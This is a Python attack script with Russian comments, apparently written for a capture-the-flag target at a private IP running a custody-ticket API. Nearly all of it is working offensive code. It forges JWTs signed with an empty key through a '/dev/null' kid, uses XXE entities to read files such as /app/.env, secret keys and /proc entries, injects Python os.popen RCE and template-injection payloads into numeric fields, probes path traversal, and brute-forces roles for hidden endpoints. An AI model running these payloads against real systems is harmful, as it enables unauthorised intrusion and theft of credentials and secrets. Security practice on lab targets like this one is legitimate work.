#!/usr/bin/env python3
"""round42 — Тест code injection в числовых полях custody + поиск новых файлов"""
import requests, time, json, hmac as hm, hashlib, base64

CASPI = "http://192.168.242.102:8007"
S = requests.Session()

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_op():
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":"/dev/null"},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":"operator",
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(b'', m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_op()}"}

def xxe_read(path, field="remarks"):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=15)
        if r.status_code == 200:
            try:
                d = r.json()
                return "OK", d.get("summary",{}).get(field,"")
            except:
                return "RAW", r.text[:500]
        elif r.status_code == 400:
            return "BIN", r.text[:200]
        else:
            return f"E{r.status_code}", r.text[:200]
    except Exception as e:
        return "ERR", str(e)[:150]

def custody_submit(fields):
    """Отправляем тикет с кастомными полями и смотрим ответ"""
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<ticket>
  <reference>{fields.get("reference","CT-TEST")}</reference>
  <tankId>{fields.get("tankId","T-01")}</tankId>
  <product>{fields.get("product","Diesel")}</product>
  <grossVolume>{fields.get("grossVolume","100")}</grossVolume>
  <netVolume>{fields.get("netVolume","99")}</netVolume>
  <density>{fields.get("density","0.85")}</density>
  <temperature>{fields.get("temperature","20")}</temperature>
  <carrier>{fields.get("carrier","TestCarrier")}</carrier>
  <remarks>{fields.get("remarks","test")}</remarks>
</ticket>'''
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=15)
        return r.status_code, r.text[:500]
    except Exception as e:
        return -1, str(e)[:200]

# ============================================================
print("="*70)
print("PHASE 1: ПРОВЕРКА eval() — АРИФМЕТИКА В ЧИСЛОВЫХ ПОЛЯХ")
print("="*70)

# Если density=1+1 вернет 2 — значит eval() используется
arith_tests = [
    ("density", "1+1", "2"),
    ("density", "2*3", "6"),
    ("density", "10/2", "5"),
    ("temperature", "1+1", "2"),
    ("temperature", "2*3", "6"),
    ("grossVolume", "1+1", "2"),
    ("grossVolume", "100+200", "300"),
    ("netVolume", "1+1", "2"),
]

for field, payload, expected in arith_tests:
    code, resp = custody_submit({field: payload})
    if code == 200:
        try:
            d = json.loads(resp)
            val = d.get("summary",{}).get(field.replace("V","_v").replace("I","_i"),
                  d.get("summary",{}).get(field, ""))
            # Проверяем все ключи
            summary = d.get("summary",{})
            found_val = None
            for k, v in summary.items():
                if v == expected:
                    found_val = (k, v)
                    break
            if found_val:
                print(f"  [EVAL!] {field}='{payload}' → {found_val[0]}='{found_val[1]}' <<<<<<")
            else:
                # Показываем что вернулось
                vals = {k:v for k,v in summary.items() if k in
                    ["density","temperature","gross_volume","net_volume","corrected_volume","normalized"]}
                print(f"  [нет] {field}='{payload}' → {vals}")
        except:
            print(f"  [{code}] {field}='{payload}' → {resp[:100]}")
    else:
        print(f"  [{code}] {field}='{payload}' → {resp[:100]}")

# ============================================================
print("\n"+"="*70)
print("PHASE 2: ПОЛНЫЙ ОТВЕТ — ВСЕ ПОЛЯ SUMMARY")
print("="*70)

# Отправляем нормальный тикет и смотрим ВСЕ поля ответа
code, resp = custody_submit({
    "reference": "CT-2026-TEST",
    "tankId": "T-01",
    "product": "Diesel (EN 590)",
    "grossVolume": "32000",
    "netVolume": "31840",
    "density": "0.8415",
    "temperature": "18.6",
    "carrier": "TestCarrier",
    "remarks": "test remarks"
})
print(f"  [{code}] Полный ответ:")
try:
    d = json.loads(resp)
    print(json.dumps(d, indent=2, ensure_ascii=False))
except:
    print(f"  {resp}")

# ============================================================
print("\n"+"="*70)
print("PHASE 3: CODE INJECTION — Python RCE ПОПЫТКИ")
print("="*70)

# Даже если eval() не подтвержден арифметикой, пробуем RCE
rce_payloads = [
    # Python eval/exec
    ("density", "__import__('os').popen('id').read()"),
    ("density", "__import__('os').popen('cat /proc/self/environ').read()"),
    ("density", "__import__('os').popen('cat /app/app.py').read()"),
    ("temperature", "__import__('os').popen('id').read()"),
    ("grossVolume", "__import__('os').popen('id').read()"),
    # Различные Python injection
    ("density", "eval('1+1')"),
    ("density", "exec('import os')"),
    ("density", "open('/etc/hostname').read()"),
    # str formatting
    ("density", "{0.__class__.__mro__[1].__subclasses__()}"),
    ("density", "{{7*7}}"),
    # Jinja2 SSTI через числовые поля
    ("temperature", "{{config}}"),
    ("grossVolume", "{{request.environ}}"),
]

for field, payload in rce_payloads:
    code, resp = custody_submit({field: payload})
    if code == 200:
        try:
            d = json.loads(resp)
            summary = d.get("summary",{})
            # Ищем признаки RCE в ЛЮБОМ поле
            full = json.dumps(summary)
            if "uid=" in full or "root" in full.lower() or "PROBE" in full or "SECRET" in full:
                print(f"  [RCE!!!] {field}='{payload[:40]}' →")
                print(f"    {full[:500]}")
            elif payload not in full and "{{" not in full:
                print(f"  [ИЗМЕНЕНО] {field}='{payload[:40]}' → {full[:200]}")
            else:
                pass  # payload echoed back unchanged
        except:
            print(f"  [{code}] {field}='{payload[:40]}' → {resp[:100]}")
    elif code == 400:
        # 400 = ошибка парсинга — может быть eval() ошибка!
        print(f"  [400!] {field}='{payload[:40]}' → {resp[:150]}")
    elif code == 500:
        print(f"  [500!!! ОШИБКА СЕРВЕРА] {field}='{payload[:40]}' → {resp[:200]}")
    else:
        print(f"  [{code}] {field}='{payload[:40]}' → {resp[:100]}")

# ============================================================
print("\n"+"="*70)
print("PHASE 4: STATIC FILES — JS/CSS/КОНФИГИ")
print("="*70)

static_paths = [
    "/static/css/app.css",
    "/static/js/app.js", "/static/js/main.js", "/static/js/ops.js",
    "/static/js/custody.js", "/static/js/probe.js", "/static/js/auth.js",
    "/static/config.json", "/static/manifest.json",
]

for path in static_paths:
    try:
        r = requests.get(f"{CASPI}{path}", timeout=5)
        if r.status_code == 200:
            print(f"\n  [200] {path} ({len(r.text)} bytes)")
            # Ищем секреты
            for kw in ["secret", "probe", "key", "hmac", "PROBE", "SECRET", "KEY"]:
                if kw in r.text:
                    import re
                    for m in re.finditer(kw, r.text, re.IGNORECASE):
                        ctx = r.text[max(0,m.start()-40):m.start()+60]
                        print(f"    НАЙДЕНО '{kw}': ...{ctx}...")
            if len(r.text) < 500:
                print(f"    Содержимое: {r.text[:400]}")
    except:
        pass

# ============================================================
print("\n"+"="*70)
print("PHASE 5: НОВЫЕ ФАЙЛЫ — JSON/YAML/TOML/INI КОНФИГИ")
print("="*70)

config_files = [
    # JSON конфиги (не содержат < или &)
    "/app/config.json", "/app/settings.json", "/app/secrets.json",
    "/app/probe.json", "/app/probe_config.json",
    "/app/devices.json", "/app/app.json",
    "/app/.secrets.json", "/app/keys.json",
    # YAML конфиги
    "/app/config.yaml", "/app/config.yml",
    "/app/settings.yaml", "/app/settings.yml",
    "/app/docker-compose.yaml", "/app/docker-compose.yml",
    "/app/probe.yaml", "/app/probe.yml",
    # TOML/INI
    "/app/config.toml", "/app/config.ini", "/app/config.cfg",
    "/app/app.cfg", "/app/flask.cfg",
    "/app/pyproject.toml",
    # .env файлы
    "/app/.env", "/app/.env.local", "/app/.env.production",
    "/app/.env.docker", "/app/env", "/app/env.txt",
    # Другие текстовые файлы без < и &
    "/app/probe_secret", "/app/probe_secret.txt",
    "/app/secret.txt", "/app/secret.key",
    "/app/PROBE_SECRET", "/app/SECRET",
    "/app/hmac_key", "/app/hmac_key.txt",
    "/app/.secret", "/app/.key",
    # Docker
    "/app/Dockerfile",
    "/run/secrets/probe_secret", "/run/secrets/PROBE_SECRET",
    "/run/secrets/hmac_key", "/run/secrets/secret",
    # Flask related
    "/app/instance/config.json", "/app/instance/config.yaml",
    "/app/instance/secrets.json",
]

for fp in config_files:
    st, val = xxe_read(fp)
    if st == "OK" and val:
        print(f"\n  [НАЙДЕН!] {fp}:")
        for line in val.split('\n')[:20]:
            print(f"    {line}")
    elif st == "BIN":
        print(f"  [БИНАРНЫЙ] {fp}")

# ============================================================
print("\n"+"="*70)
print("PHASE 6: PATH TRAVERSAL В STATIC FILES")
print("="*70)

traversal_paths = [
    "/static/../app.py",
    "/static/../keys/carrier",
    "/static/../keys/operator",
    "/static/..%2fapp.py",
    "/static/..%2fkeys/carrier",
    "/static/%2e%2e/app.py",
    "/static/%2e%2e/keys/carrier",
    "/static/../../etc/hostname",
    "/static/../../../proc/self/environ",
]

for path in traversal_paths:
    try:
        r = requests.get(f"{CASPI}{path}", timeout=5, allow_redirects=False)
        if r.status_code == 200 and len(r.text) > 0:
            preview = r.text[:200].replace('\n',' ')
            print(f"  [200!] {path}: {preview}")
        elif r.status_code not in [404, 400, 403]:
            print(f"  [{r.status_code}] {path}: {r.text[:80]}")
    except:
        pass

# ============================================================
print("\n"+"="*70)
print("PHASE 7: JWT С РАЗНЫМИ РОЛЯМИ — СКРЫТЫЕ ENDPOINT'Ы")
print("="*70)

# Пробуем роли которые могут открыть новые endpoint'ы
roles = ["admin", "superadmin", "root", "debug", "system",
         "probe", "gateway", "manager", "engineer"]

for role in roles:
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":"/dev/null"},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    token = m+'.'+b64u(hm.new(b'', m.encode(), hashlib.sha256).digest())
    auth = {"Authorization": f"Bearer {token}"}

    # Тестируем endpoint'ы которые могут быть доступны только определенным ролям
    for ep in ["/api/ops/probe/config", "/api/ops/config", "/api/admin",
               "/api/admin/config", "/api/debug", "/api/ops/probe/secret",
               "/api/ops/keys", "/api/ops/secrets", "/api/config",
               "/api/ops/probe/key", "/api/system", "/api/gateway"]:
        try:
            r = requests.get(f"{CASPI}{ep}", headers=auth, timeout=3)
            if r.status_code not in [401, 403, 404, 405]:
                print(f"  [{r.status_code}] role={role} {ep}: {r.text[:100]}")
        except:
            pass

# ============================================================
print("\n"+"="*70)
print("PHASE 8: kid КАК PATH TRAVERSAL В JWT")
print("="*70)

# А что если kid может читать файлы через path traversal
# и мы можем узнать содержимое по ответу сервера?
kid_tests = [
    # Тестируем разные ответы для существующих vs несуществующих файлов
    ("/dev/null", b"", "пустой файл (контроль)"),
    ("/etc/hostname", b"5407f6317f5c\n", "hostname (контроль)"),
    ("/nonexistent_file_12345", b"", "несуществующий файл"),
    ("/app/keys/carrier", b"", "carrier key (неизвестный ключ)"),
    ("/proc/self/environ", b"", "environ (с нулями)"),
]

for kid, key, label in kid_tests:
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":kid},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":"operator",
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    token = m+'.'+b64u(hm.new(key, m.encode(), hashlib.sha256).digest())

    try:
        r = requests.get(f"{CASPI}/api/auth/me",
            headers={"Authorization": f"Bearer {token}"}, timeout=5)
        print(f"  [{r.status_code}] kid={kid:40s} key={key[:10]!r:15s} ({label})")
        if r.status_code != 200:
            print(f"    Ответ: {r.text[:100]}")
    except Exception as e:
        print(f"  [ERR] kid={kid} ({label}): {e}")

# ============================================================
print("\n"+"="*70)
print("PHASE 9: /proc — БОЛЬШЕ ИНФЫ О ПРОЦЕССЕ")
print("="*70)

proc_files = [
    "/proc/self/cgroup",
    "/proc/self/mounts",
    "/proc/self/net/tcp",
    "/proc/self/net/tcp6",
    "/proc/self/net/udp",
    "/proc/self/net/unix",
    "/proc/self/task/1/children",
    "/proc/1/cgroup",
    "/proc/1/mounts",
    "/proc/version",
    "/proc/cpuinfo",
]

for fp in proc_files:
    st, val = xxe_read(fp)
    if st == "OK" and val:
        lines = val.split('\n')
        print(f"\n  {fp} ({len(lines)} строк):")
        for line in lines[:10]:
            print(f"    {line}")
        if len(lines) > 10:
            print(f"    ... (ещё {len(lines)-10} строк)")

print("\n"+"="*70)
print("DONE")
print("="*70)
